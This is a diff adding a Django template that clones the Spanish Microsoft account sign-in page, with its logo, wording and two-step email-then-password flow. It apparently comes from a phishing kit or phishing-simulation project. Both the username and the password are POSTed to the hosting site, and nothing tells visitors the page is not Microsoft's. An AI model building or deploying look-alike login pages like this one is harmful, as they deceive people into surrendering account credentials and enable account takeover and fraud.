@@ -1,0 +1,156 @@
+{% load static %}
+<html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <title>Iniciar sesión en tu cuenta Microsoft</title>
+    <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1.0, maximum-scale=3.0, minimun-scale=1.0"> 
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
+    <link rel="stylesheet" href="{% static 'css/microsoft/log_in.css' %}">
+    <!-- <link rel="stylesheet" href="log_in.css" type="text/css" > -->
+  </head>
+  <body>
+      <div id="main">
+        <img src="./static/images/microsoft/logo.svg" width="108">
+        <form action="#" method="POST" id="login">
+          <div id="form-username">
+            <h3>Iniciar sesión</h3>
+            <div>
+              <span id="userError">Escribe una dirección de correo electrónico, un número de teléfono o un nombre de Skype válidos.</span>
+            </div>
+            <input type="text" name="user" id="user" placeholder="Correo electrónico, teléfono o Skype" onkeydown="inputChange()" onkeyup="keyUp(event)" autofocus>
+            <div>
+              <p>¿No tiene una cuenta? <a href="#" class="blue">Cree una.</a></p>
+            </div>
+            <button id="next" type="button" class="form-button siguiente" onclick="checkUser()">Siguiente</button>
+          </div>
+          <div id="form-password">
+            <div id="go-back">
+              <button type="button" onclick="goBack()"><img src="./static/images/microsoft/back.svg" width="24"></button>
+              <span id="userEmail" class="email"></span>
+            </div>
+            <h3>Escribir contraseña</h3>
+            <div>
+              <span id="passError">Escribe la contraseña de tu cuenta Microsoft.</span>
+            </div>
+            <input type="password" name="pass" id="pass" placeholder="Contraseña" onkeydown="passChange()" onkeypress="formHandler()" autofocus>
+            <p><a href="#" class="blue">¿Olvidó su contraseña?</a></p>
+            <p><a href="#" class="blue">Iniciar sesión con Windows Hello o una llave de seguridad</a></p>
+            <button type="button" id="submitBtn" class="form-button" onclick="formHandler()">Iniciar sesión</button>
+          </div>
+        </form>
+      </div>
+      <div id="second">
+        <a>
+          <div>
+            <div><img src="./static/images/microsoft/key.svg" width="32"></div>
+            <div><h6>Opciones de inicio de sesión</h6></div>
+          </div>
+        </a>
+      </div>
+      <footer>
+        <a href="#">Términos de uso</a>
+        <a href="#">Privacidad y cookies</a>
+        <a href="#" class="points">...</a>
+      </footer>
+  </body>
+  <script>
+    userError = false;
+    passError = false;
+
+    
+    function keyUp(event) { //user input enter
+      if (event.key === 'Enter' || event.keyCode === 13) checkUser();
+    }
+    
+    function checkUser() { //click "siguiente"
+      //check email
+      email = document.getElementById("user").value;
+      if (email != "") {
+        //email correct
+        document.getElementById("userEmail").textContent = email;
+        //document.getElementById("form-username").style.display = 'none';
+        //document.getElementById("form-password").style.display = 'block';
+        document.getElementById("second").classList.add("hidden");
+        document.getElementById("form-username").classList.add("fadeOutLeft");
+        setTimeout(function() {
+          // remove the class from the element
+          document.getElementById("form-username").classList.add("hide");
+          setTimeout(function() {
+            document.getElementById("main").style.height = '280px';
+            //Check if form password have the class "hide"
+            if (document.getElementById("form-password").classList.contains("hide")) {
+              document.getElementById("form-password").classList.remove("hide");
+            }
+            document.getElementById("form-password").classList.add("fadeInLeft");
+          }, 200);
+        }, 180);
+      }
+      else {
+        document.getElementById("userError").style.display = 'block';
+        document.getElementById("user").classList.add("inputError");
+        document.getElementById("next").classList.remove("siguiente");
+      }      
+    };
+  
+    function goBack() {
+      //Start animation
+      document.getElementById("form-password").classList.add("fadeOutRight");
+      setTimeout(function() {
+        // remove the class from the element
+        document.getElementById("form-password").classList.add("hide");
+        setTimeout(function() {
+          document.getElementById("form-password").classList.remove("fadeInLeft");
+          document.getElementById("form-password").classList.remove("fadeOutRight");
+          document.getElementById("form-password").classList.remove("hide");
+          document.getElementById("form-username").classList.remove("fadeOutLeft");
+
+          document.getElementById("form-username").classList.add("fadeInRight");
+          document.getElementById("form-username").classList.remove("hide");
+          document.getElementById("main").style.height = '250px';
+          document.getElementById("second").classList.add("visible");
+          setTimeout(function() {
+            document.getElementById("form-username").classList.remove("fadeInRight");
+            document.getElementById("second").classList.remove("hidden");
+            document.getElementById("second").classList.remove("visible");
+          }, 200);
+          }, 200);
+        }, 180);
+    }
+
+    function formHandler() {
+      //check password
+      pass = document.getElementById("pass").value;
+      if (pass != "") {
+        document.getElementById("login").submit();
+      } 
+      else {
+        document.getElementById("passError").style.display = 'block';
+        document.getElementById("pass").classList.add("inputError");
+      }
+    }
+    
+    function inputChange() {
+      input = document.getElementById("user");
+      if (input.classList.contains("inputError")) {
+        document.getElementById("userError").style.display = 'none';
+        document.getElementById("user").classList.remove("inputError");
+        document.getElementById("next").classList.add("siguiente");
+      }
+    }
+
+    function passChange() {
+      input = document.getElementById("pass");
+      if (input.classList.contains("inputError")) {
+        document.getElementById("passError").style.display = 'none';
+        document.getElementById("pass").classList.remove("inputError");
+      }
+    }
+
+    function delay(time) {
+      return new Promise(resolve => setTimeout(resolve, time));
+    }
+
+    delay(1000).then(() => console.log('ran after 1 second1 passed'));
+
+  </script>
+</html>
